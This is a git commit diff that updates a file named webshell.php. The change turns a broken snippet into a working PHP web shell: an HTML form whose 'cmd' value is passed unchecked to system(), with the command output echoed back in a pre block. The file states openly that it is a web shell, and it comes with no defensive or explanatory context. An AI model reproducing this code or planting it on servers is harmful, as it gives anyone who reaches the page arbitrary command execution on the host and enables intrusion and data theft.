1540b5e2273b059bd88f36fa4b7591b51ddffeb0
ha2o <89858900+haho0304@users.noreply.github.com>
2024-05-28 17:48:35 +0900

    Update webshell.php

--- webshell.php
+++ webshell.php
@@ -3,12 +3,17 @@
   <h1>Web shell</h1>
 </head>
 <body>
-  <input type=text name="cmd">
-  <input type="submit">
-
-  <?php
-  if(isset($_GET['cmd'])){
-    system($_GET['cmd']);
-  ?>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+  if(isset($_GET['cmd']))
+  {
+      system($_GET['cmd']);
+  }
+?>
+</pre>
 </body>
 </html>
